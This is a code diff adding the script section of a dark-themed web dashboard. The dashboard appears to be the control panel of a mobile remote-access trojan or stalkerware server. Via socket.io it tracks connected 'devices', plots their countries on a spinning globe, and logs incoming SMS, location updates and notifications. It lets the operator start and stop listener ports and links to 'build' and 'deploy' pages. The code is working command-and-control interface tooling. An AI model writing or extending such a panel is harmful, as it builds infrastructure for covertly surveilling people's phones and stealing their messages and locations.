+  <div style="font-size:9px;color:#7a0000;margin-bottom:8px;letter-spacing:1px;">[ ACTIVE_LISTENERS ]</div>
+  <div id="active-ports-list" style="font-size:10px;display:flex;flex-direction:column;gap:6px;"></div>
+</div>
+
+<script src="/socket.io/socket.io.js"></script>
+<script>
+const socket = io();
+let connectedClients = [];
+let activePorts = [];
+let targetCountry = null;
+let currentRotation = 0;
+let isRotating = true;
+
+// ═══════════════════════════════════════════
+//  ANIMATED BACKGROUND
+// ═══════════════════════════════════════════
+(function() {
+  const canvas = document.getElementById('bg-canvas');
+  const ctx = canvas.getContext('2d');
+  let W, H, drops;
+
+  function resize() {
+    W = canvas.width = window.innerWidth;
+    H = canvas.height = window.innerHeight;
+    drops = Array.from({length: Math.floor(W / 18)}, () => Math.random() * H);
+  }
+  window.addEventListener('resize', resize);
+  resize();
+
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*<>/\\|{}[]';
+
+  function draw() {
+    ctx.fillStyle = 'rgba(0,0,0,0.05)';
+    ctx.fillRect(0, 0, W, H);
+    ctx.font = '13px Share Tech Mono, monospace';
+    for (let i = 0; i < drops.length; i++) {
+      const c = chars[Math.floor(Math.random() * chars.length)];
+      const progress = drops[i] / H;
+      const alpha = progress < 0.3 ? progress / 0.3 : (1 - progress) / 0.7;
+      ctx.fillStyle = `rgba(${i % 3 === 0 ? '180,0,0' : '100,0,0'},${Math.max(0.03, alpha * 0.18)})`;
+      ctx.fillText(c, i * 18, drops[i]);
+      drops[i] += 15 + Math.random() * 8;
+      if (drops[i] > H) drops[i] = -Math.random() * H;
+    }
+  }
+  setInterval(draw, 50);
+})();
+
+// ═══════════════════════════════════════════
+//  3D GLOBE WITH TARGETING
+// ═══════════════════════════════════════════
+(function() {
+  const canvas = document.getElementById('globe-canvas');
+  const ctx = canvas.getContext('2d');
+  const W = 420, H = 420, R = 190;
+  const CX = W / 2, CY = H / 2;
+
+  let hoveredCountry = null;
+  const activeCountries = new Set();
+  let rotationSpeed = 0.004;
+
+  const countries = [
+    { name: 'RUSSIA', lat: 61, lon: 105, size: 1.8 },
+    { name: 'CANADA', lat: 60, lon: -95, size: 1.5 },
+    { name: 'USA', lat: 38, lon: -97, size: 1.4 },
+    { name: 'CHINA', lat: 35, lon: 103, size: 1.3 },
+    { name: 'BRAZIL', lat: -10, lon: -53, size: 1.2 },
+    { name: 'AUSTRALIA', lat: -25, lon: 133, size: 1.1 },
+    { name: 'INDIA', lat: 20, lon: 78, size: 1.0 },
+    { name: 'ARGENTINA', lat: -35, lon: -65, size: 0.9 },
+    { name: 'KAZAKHSTAN', lat: 48, lon: 68, size: 0.85 },
+    { name: 'ALGERIA', lat: 28, lon: 2, size: 0.8 },
+    { name: 'MEXICO', lat: 24, lon: -102, size: 0.75 },
+    { name: 'INDONESIA', lat: -2, lon: 118, size: 0.7 },
+    { name: 'SUDAN', lat: 15, lon: 30, size: 0.65 },
+    { name: 'LIBYA', lat: 27, lon: 18, size: 0.6 },
+    { name: 'IRAN', lat: 32, lon: 53, size: 0.6 },
+    { name: 'MONGOLIA', lat: 46, lon: 105, size: 0.6 },
+    { name: 'PERU', lat: -10, lon: -76, size: 0.55 },
+    { name: 'CHAD', lat: 15, lon: 19, size: 0.55 },
+    { name: 'NIGER', lat: 17, lon: 9, size: 0.5 },
+    { name: 'ANGOLA', lat: -12, lon: 18, size: 0.5 },
+    { name: 'MALI', lat: 17, lon: -2, size: 0.5 },
+    { name: 'SOUTH AFRICA', lat: -29, lon: 25, size: 0.55 },
+    { name: 'COLOMBIA', lat: 4, lon: -73, size: 0.5 },
+    { name: 'ETHIOPIA', lat: 9, lon: 40, size: 0.5 },
+    { name: 'BOLIVIA', lat: -17, lon: -65, size: 0.45 },
+    { name: 'MAURITANIA', lat: 20, lon: -11, size: 0.45 },
+    { name: 'EGYPT', lat: 26, lon: 30, size: 0.5 },
+    { name: 'TANZANIA', lat: -6, lon: 35, size: 0.45 },
+    { name: 'NIGERIA', lat: 10, lon: 8, size: 0.45 },
+    { name: 'VENEZUELA', lat: 8, lon: -66, size: 0.45 },
+    { name: 'PAKISTAN', lat: 30, lon: 69, size: 0.45 },
+    { name: 'TURKEY', lat: 39, lon: 35, size: 0.4 },
+    { name: 'GERMANY', lat: 51, lon: 10, size: 0.3 },
+    { name: 'FRANCE', lat: 46, lon: 2, size: 0.3 },
+    { name: 'UK', lat: 54, lon: -2, size: 0.25 },
+    { name: 'JAPAN', lat: 36, lon: 138, size: 0.35 },
+    { name: 'UKRAINE', lat: 49, lon: 32, size: 0.35 },
+    { name: 'SWEDEN', lat: 62, lon: 17, size: 0.3 },
+    { name: 'NORWAY', lat: 65, lon: 13, size: 0.3 },
+    { name: 'SPAIN', lat: 40, lon: -4, size: 0.3 },
+    { name: 'SAUDI ARABIA', lat: 24, lon: 45, size: 0.45 },
+  ];
+
+  function latLonTo3D(lat, lon, r) {
+    const phi = (90 - lat) * Math.PI / 180;
+    const theta = (lon + 180) * Math.PI / 180;
+    return {
+      x: -r * Math.sin(phi) * Math.cos(theta),
+      y:  r * Math.cos(phi),
+      z:  r * Math.sin(phi) * Math.sin(theta),
+    };
+  }
+
+  function project(x, y, z) {
+    const rotX = x * Math.cos(currentRotation) - z * Math.sin(currentRotation);
+    const rotZ = x * Math.sin(currentRotation) + z * Math.cos(currentRotation);
+    return { px: CX + rotX, py: CY - y, pz: rotZ, visible: rotZ > 0 };
+  }
+
+  const GRID_LAT = 30, GRID_LON = 60;
+
+  function drawGlobe() {
+    ctx.clearRect(0, 0, W, H);
+
+    // Atmosphere
+    const grad = ctx.createRadialGradient(CX, CY, R * 0.85, CX, CY, R * 1.15);
+    grad.addColorStop(0, 'rgba(60,0,0,0)');
+    grad.addColorStop(0.7, 'rgba(120,0,0,0.08)');
+    grad.addColorStop(1, 'rgba(200,0,0,0.15)');
+    ctx.beginPath(); ctx.arc(CX, CY, R * 1.15, 0, Math.PI * 2);
+    ctx.fillStyle = grad; ctx.fill();
+
+    // Ocean grid
+    for (let latI = 0; latI < GRID_LAT; latI++) {
+      for (let lonI = 0; lonI < GRID_LON; lonI++) {
+        const lat0 = -90 + latI * (180 / GRID_LAT);
+        const lat1 = lat0 + 180 / GRID_LAT;
+        const lon0 = -180 + lonI * (360 / GRID_LON);
+        const lon1 = lon0 + 360 / GRID_LON;
+
+        const p0 = latLonTo3D(lat0, lon0, R);
+        const p1 = latLonTo3D(lat0, lon1, R);
+        const p2 = latLonTo3D(lat1, lon1, R);
+        const p3 = latLonTo3D(lat1, lon0, R);
+
+        const pp = [p0, p1, p2, p3].map(p => project(p.x, p.y, p.z));
+        if (pp.some(p => p.pz < 0)) continue;
+        if (pp.every(p => !p.visible)) continue;
+
+        const avgZ = pp.reduce((s, p) => s + p.pz, 0) / 4;
+        const light = 0.3 + (avgZ / R) * 0.4;
+        ctx.beginPath(); ctx.moveTo(pp[0].px, pp[0].py);
+        for (let i = 1; i < pp.length; i++) ctx.lineTo(pp[i].px, pp[i].py);
+        ctx.closePath();
+        ctx.fillStyle = `rgba(20,20,30,${light * 0.9})`; ctx.fill();
+        ctx.strokeStyle = `rgba(30,0,0,0.4)`; ctx.lineWidth = 0.3; ctx.stroke();
+      }
+    }
+
+    const tooltip = document.getElementById('country-tooltip');
+    let foundHover = null;
+
+    countries.forEach(country => {
+      const pos3d = latLonTo3D(country.lat, country.lon, R);
+      const proj = project(pos3d.x, pos3d.y, pos3d.z);
+      if (!proj.visible || proj.pz < 5) return;
+
+      const screenR = country.size * 22 * (proj.pz / R);
+      const isActive = activeCountries.has(country.name);
+      const isHovered = hoveredCountry === country.name;
+
+      let baseColor, glowColor;
+      if (isActive) {
+        baseColor = isHovered ? 'rgba(180,180,180,0.95)' : 'rgba(140,140,140,0.85)';
+        glowColor = 'rgba(200,200,200,0.4)';
+      } else {
+        const light = 0.5 + (proj.pz / R) * 0.5;
+        const r = Math.floor(140 * light);
+        baseColor = isHovered ? `rgba(255,60,60,0.95)` : `rgba(${r},0,0,0.88)`;
+        glowColor = isHovered ? 'rgba(255,60,60,0.5)' : 'rgba(200,0,0,0.3)';
+      }
+
+      if (isHovered) {
+        ctx.beginPath(); ctx.arc(proj.px, proj.py, screenR * 1.4, 0, Math.PI * 2);
+        ctx.fillStyle = glowColor; ctx.fill();
+      }
+
+      ctx.beginPath(); ctx.arc(proj.px, proj.py, screenR, 0, Math.PI * 2);
+      ctx.fillStyle = baseColor; ctx.fill();
+      ctx.strokeStyle = 'rgba(0,0,0,0.6)'; ctx.lineWidth = 1; ctx.stroke();
+
+      const fontSize = Math.max(7, Math.min(11, screenR * 0.7));
+      ctx.font = `${fontSize}px 'Share Tech Mono', monospace`;
+      ctx.textAlign = 'center'; ctx.textBaseline = 'middle';
+      ctx.fillStyle = isActive ? 'rgba(0,0,0,0.8)' : 'rgba(255,255,255,0.7)';
+      if (screenR > 10) ctx.fillText(country.name, proj.px, proj.py);
+
+      const mx = lastMouse.x, my = lastMouse.y;
+      const dist = Math.sqrt((mx - proj.px) ** 2 + (my - proj.py) ** 2);
+      if (dist < screenR * 1.3) foundHover = country.name;
+    });
+
+    hoveredCountry = foundHover;
+    if (hoveredCountry) {
+      tooltip.style.opacity = '1'; tooltip.textContent = hoveredCountry;
+      tooltip.style.left = (lastMouse.x + 14) + 'px'; tooltip.style.top = (lastMouse.y - 20) + 'px';
+    } else tooltip.style.opacity = '0';
+
+    // Rotation logic
+    if (isRotating) {
+        currentRotation += rotationSpeed;
+    } else if (targetCountry) {
+        const target = countries.find(c => c.name === targetCountry);
+        if (target) {
+            // Target lon determines rotation. 
+            // In our project function: rotX = x*cos(rot) - z*sin(rot)
+            // theta = (lon + 180) * PI / 180
+            // We want rotZ to be max (positive) for visibility and rotX to be 0 (center)
+            const targetRot = - (target.lon + 90) * Math.PI / 180;
+            const diff = targetRot - currentRotation;
+            currentRotation += diff * 0.05; // Smooth animate to target
+        }
+    }
+
+    requestAnimationFrame(drawGlobe);
+  }
+
+  const lastMouse = { x: -999, y: -999 };
+  canvas.addEventListener('mousemove', e => {
+    const rect = canvas.getBoundingClientRect();
+    lastMouse.x = e.clientX - rect.left;
+    lastMouse.y = e.clientY - rect.top;
+  });
+  canvas.addEventListener('mouseleave', () => { lastMouse.x = -999; lastMouse.y = -999; });
+
+  drawGlobe();
+
+  window.activateCountry = function(name) {
+    if (!name) return;
+    const n = name.toUpperCase();
+    activeCountries.add(n);
+    targetCountry = n;
+    isRotating = false;
+    updateLocationCard();
+  };
+
+  window.deactivateCountry = function(name) {
+    if (!name) return;
+    const n = name.toUpperCase();
+    activeCountries.delete(n);
+    if (targetCountry === n) {
+        targetCountry = null;
+        isRotating = true;
+    }
+    updateLocationCard();
+  };
+
+  let locationCycleIdx = 0;
+  function updateLocationCard() {
+    const list = document.getElementById('location-list');
+    if (connectedClients.length === 0) {
+        list.innerHTML = '';
+        for (let i = 0; i < 3; i++) {
+            list.innerHTML += `<div class="location-item"><div class="loc-dot" style="animation-delay:${i*0.5}s"></div><span class="loc-name">—</span></div>`;
+        }
+        return;
+    }
+
+    const c = connectedClients[locationCycleIdx % connectedClients.length];
+    const country = c.details.country || 'Unknown';
+    
+    list.innerHTML = `
+        <div class="location-item"><div class="loc-dot"></div><span class="loc-name">${c.details.model}</span></div>
+        <div class="location-item"><div class="loc-dot" style="animation-delay:0.3s"></div><span class="loc-name" style="font-size:8px; color:var(--red-dim); overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">ID: ${c.id}</span></div>
+        <div class="location-item"><div class="loc-dot" style="animation-delay:0.6s"></div><span class="loc-name" style="color:var(--red-bright)">LOC: ${country.toUpperCase()}</span></div>
+    `;
+    
+    if (connectedClients.length > 1) {
+        locationCycleIdx++;
+    }
+  }
+  setInterval(updateLocationCard, 5000);
+  window.updateLocationCard = updateLocationCard;
+})();
+
+// ═══════════════════════════════════════════
+//  REAL-TIME DASHBOARD LOGIC
+// ═══════════════════════════════════════════
+(function() {
+    const notifList = document.getElementById('notif-list');
+    const notifFilter = document.getElementById('notif-filter');
+    let allNotifications = [];
+    
+    function addNotif(msg, type = '', clientId = 'all') {
+        const time = new Date().toTimeString().slice(0,8);
+        const n = { time, msg, type, clientId };
+        allNotifications.unshift(n);
+        if (allNotifications.length > 50) allNotifications.pop();
+        renderNotifications();
+    }
+
+    function renderNotifications() {
+        const filter = notifFilter.value;
+        notifList.innerHTML = '';
+        allNotifications.filter(n => filter === 'all' || n.clientId === filter).forEach((n, i) => {
+            const el = document.createElement('div');
+            el.className = 'notif-item';
+            el.innerHTML = `<div class="notif-time">${n.time}</div><div class="notif-msg ${n.type}">${n.msg}</div>`;
+            notifList.appendChild(el);
+        });
+    }
+
+    notifFilter.onchange = renderNotifications;
+
+    function updateFilterDropdown() {
+        const current = notifFilter.value;
+        notifFilter.innerHTML = '<option value="all">ALL DEVICES</option>';
+        connectedClients.forEach(c => {
+            const opt = document.createElement('option');
+            opt.value = c.id;
+            opt.textContent = c.details.model;
+            notifFilter.appendChild(opt);
+        });
+        notifFilter.value = current;
+    }
+
+    // Socket Events
+    socket.on('initial_clients', (clients) => {
+        connectedClients = clients;
+        document.getElementById('online-count').textContent = clients.length;
+        updateFilterDropdown();
+        window.updateLocationCard();
+        if (clients.length > 0) {
+            const last = clients[clients.length-1];
+            if (last.details.country && last.details.country !== 'Unknown') {
+                window.activateCountry(last.details.country);
+            }
+        }
+    });
+
+    socket.on('client_connected', (client) => {
+        connectedClients.push(client);
+        document.getElementById('online-count').textContent = connectedClients.length;
+        updateFilterDropdown();
+        addNotif(`NEW DEVICE: ${client.details.model}`, 'ok', client.id);
+        window.updateLocationCard();
+        if (client.details.country && client.details.country !== 'Unknown') {
+            window.activateCountry(client.details.country);
+        }
+    });
+
+    socket.on('client_disconnected', (id) => {
+        const idx = connectedClients.findIndex(c => c.id === id);
+        if (idx !== -1) {
+            const country = connectedClients[idx].details.country;
+            addNotif(`DISCONNECTED: ${connectedClients[idx].details.model}`, 'err', id);
+            connectedClients.splice(idx, 1);
+            if (country) window.deactivateCountry(country);
+        }
+        document.getElementById('online-count').textContent = connectedClients.length;
+        updateFilterDropdown();
+        window.updateLocationCard();
+    });
+
+    socket.on('client_data', (payload) => {
+        const client = connectedClients.find(c => c.id === payload.id);
+        const name = client ? client.details.model : 'Unknown';
+        
+        if (payload.data.type === 'location') {
+            addNotif(`LOCATION UPDATE: ${name}`, 'ok', payload.id);
+            if (payload.data.country) {
+                if (client) client.details.country = payload.data.country;
+                window.activateCountry(payload.data.country);
+            }
+        } else if (payload.data.type === 'sms') {
+            addNotif(`NEW SMS: ${name}`, 'warn', payload.id);
+        } else if (payload.data.type === 'notification') {
+            addNotif(`NOTIF: ${name} - ${payload.data.title}`, '', payload.id);
+        }
+    });
+
+    socket.on('stats_update', ({ stats, sysInfo }) => {
+        function fmt(b) {
+            if (b < 1024) return b + ' B';
+            if (b < 1048576) return (b / 1024).toFixed(1) + ' KB';
+            return (b / 1048576).toFixed(2) + ' MB';
+        }
+        
+        document.getElementById('sent-packets').textContent = stats.sent.packets;
+        document.getElementById('sent-bytes').textContent = fmt(stats.sent.bytes);
+        document.getElementById('sent-rate').textContent = fmt(stats.sent.rate) + '/s';
+        
+        document.getElementById('recv-packets').textContent = stats.recv.packets;
+        document.getElementById('recv-bytes').textContent = fmt(stats.recv.bytes);
+        document.getElementById('recv-rate').textContent = fmt(stats.recv.rate) + '/s';
+
+        document.getElementById('sys-cpu').textContent = sysInfo.cpu;
+        document.getElementById('sys-ram').textContent = sysInfo.ram;
+        document.getElementById('sys-uptime').textContent = sysInfo.uptime;
+
+        const threat = connectedClients.length > 5 ? 'CRITICAL' : (connectedClients.length > 0 ? 'ELEVATED' : 'LOW');
+        const threatEl = document.getElementById('threat-level');
+        threatEl.textContent = `THREAT: ${threat}`;
+        threatEl.style.color = connectedClients.length > 0 ? 'var(--red-bright)' : 'var(--green-ok)';
+    });
+
+    socket.on('listeners_update', (ports) => {
+        activePorts = ports;
+        document.getElementById('port-count').textContent = ports.length;
+        document.getElementById('port-display').textContent = ports.join(', ') || 'NONE';
+        const list = document.getElementById('active-ports-list');
+        list.innerHTML = '';
+        ports.forEach(p => {
+            const item = document.createElement('div');
+            item.style = 'display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #222; padding:4px 0;';
+            item.innerHTML = `<span>PORT: ${p}</span> <button onclick="socket.emit('stop_listener', ${p})" style="background:none; border:none; color:var(--red-bright); cursor:pointer; font-size:8px; font-family:var(--font-display);">[ STOP ]</button>`;
+            list.appendChild(item);
+        });
+    });
+
+    // Port Dropdown Toggle
+// ── PORT DROPDOWN — fully rebuilt, body-level element, no clip issues ──
+    (function() {
+        const trigger = document.getElementById('port-display');
+        const dd      = document.getElementById('port-dropdown');
+        const input   = document.getElementById('new-port-input');
+        const btn     = document.getElementById('add-port-btn');
+
+        // Open/close on trigger click
+        trigger.addEventListener('click', function(e) {
+            e.stopPropagation();
+            if (dd.style.display === 'none') {
+                const rect = trigger.getBoundingClientRect();
+                dd.style.top  = (rect.bottom + 8) + 'px';
+                dd.style.left = rect.left + 'px';
+                dd.style.display = 'block';
+                setTimeout(() => input.focus(), 50);
+            } else {
+                dd.style.display = 'none';
+            }
+        });
+
+        // Clicks inside dropdown stay inside — nothing closes it
+        dd.addEventListener('click', function(e) { e.stopPropagation(); });
+        dd.addEventListener('mousedown', function(e) { e.stopPropagation(); });
+
+        // Only close when clicking truly outside
+        document.addEventListener('click', function(e) {
+            if (!dd.contains(e.target) && e.target !== trigger) {
+                dd.style.display = 'none';
+            }
+        });
+
+        // START button — emit to server
+        btn.addEventListener('click', function() {
+            const port = parseInt(input.value);
+            if (!port || port < 1 || port > 65535) return;
+            socket.emit('start_listener', port);
+            input.value = '';
+        });
+
+        // Also allow Enter key in input
+        input.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') btn.click();
+        });
+    })();
+
+})();
+
+// ═══════════════════════════════════════════
+//  CLOCK
+// ═══════════════════════════════════════════
+(function() {
+  const clock = document.getElementById('clock');
+  function tick() {
+    const d = new Date();
+    clock.textContent = d.toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
+  }
+  tick(); setInterval(tick, 1000);
+})();
+
+// ═══════════════════════════════════════════
+//  SPA NAVIGATION
+// ═══════════════════════════════════════════
+(function() {
+  const homeView   = document.getElementById('home-view');
+  const iframeView = document.getElementById('iframe-view');
+
+const pages = {
+    'clients':        'UI/clients.html',
+    'logs':           'UI/logs.html',
+    'build':          'UI/build.html',
+    'deploy':         'UI/deploy.html',
+    'settings':       'UI/settings.html',
+  };
+
+const navBtns = {
+    'home':           document.getElementById('btn-home'),
+    'clients':        document.getElementById('btn-clients'),
+    'logs':           document.getElementById('btn-logs'),
+    'build':          document.getElementById('btn-add'),
+    'deploy':         document.getElementById('btn-deploy'),
+    'settings':       document.getElementById('btn-settings'),
+  };
+
+  function setActive(key) {
+    Object.values(navBtns).forEach(b => b && b.classList.remove('active'));
+    if (navBtns[key]) navBtns[key].classList.add('active');
+  }
+
+  document.getElementById('btn-home').onclick = () => {
+    iframeView.style.display = 'none';
+    homeView.style.display   = '';
+    iframeView.src = 'about:blank';
+    setActive('home');
+  };
+
+  window.navigateTo = function(key) {
+    if (!pages[key]) return;
+    homeView.style.display   = 'none';
+    iframeView.style.display = 'block';
+    iframeView.src = pages[key];
+    setActive(key);
+  };
+  setActive('home');
+})();
+
+// Terminal Dummy Lines
+(function() {
+  const lines = document.getElementById('term-lines');
+  const msgs = ['Scanning topology...', 'Route established', 'AES-256 handshake OK', 'Targeting active', 'System monitoring ON'];
+  let idx = 0;
+  function addLine() {
+    const el = document.createElement('div');
+    el.className = 'term-line';
+    el.textContent = '> ' + msgs[idx++ % msgs.length];
+    lines.appendChild(el);
+    if (lines.children.length > 4) lines.removeChild(lines.firstChild);
+    setTimeout(() => el.classList.add('active'), 50);
+  }
+  addLine(); setInterval(addLine, 4000);
+})();
+</script>
+</body>
+</html>
